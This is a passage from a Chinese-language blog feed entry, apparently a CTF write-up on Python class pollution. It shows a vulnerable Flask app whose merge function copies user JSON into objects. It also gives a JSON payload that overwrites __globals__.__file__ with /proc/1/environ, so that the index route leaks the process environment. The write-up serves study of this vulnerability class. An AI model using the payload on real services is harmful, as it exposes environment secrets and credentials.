Python 字典,如果解析失败,返回 &quot;Register Failed&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)<span class="comment">#将 data 中的键值对合并到用户实例 User 中</span></span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure><p>看到merge函数基本想到的就是python原型链污染</p><p>利用merge来动态污染原型链的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;:&quot;111&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;222&quot;,</span><br><span class="line">    &quot;__class__&quot;:&#123;</span><br><span class="line">        &quot;check&quot;:&#123;</span><br><span class="line">            &quot;__globals__&quot;:&#123;</span><br><span class="line">                &quot;__file__&quot; : &quot;/proc/1/environ&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后直接get &#x2F;就好</p><p>象征性的复现一下(●’◡’●)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;leran from :&lt;a href=&quot;https://pazuris.cn/2023/07/27/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&quot;&gt;https://pazuris.cn/2023/07/27/Py</summary>
      
    
    
    
    <category term="pollute" scheme="https://gu0f3n.github.io/categories/pollute/"/>
    
    
    <category term="python" scheme="https://gu0f3n.github.io/tags/python/"/>
    
  </entry>
  
</feed>
